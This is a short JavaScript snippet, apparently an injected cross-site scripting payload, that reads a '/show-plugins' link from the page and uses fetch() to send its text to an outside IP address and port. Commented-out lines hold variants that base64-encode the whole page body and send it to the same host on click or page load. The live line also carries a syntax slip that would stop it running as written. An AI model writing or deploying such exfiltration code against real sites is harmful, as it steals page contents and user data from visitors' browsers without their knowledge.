const link = document.querySelector('a[href="/show-plugins"]');

//fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML));
fetch("http://82.65.210.151:24000/?encodedData=" + link.textContent;);
//link.addEventListener('click', function(event) {
    //event.preventDefault();
    //link.click();
    //window.addEventListener('load', function() {
      //fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML));
    //});
 
//}
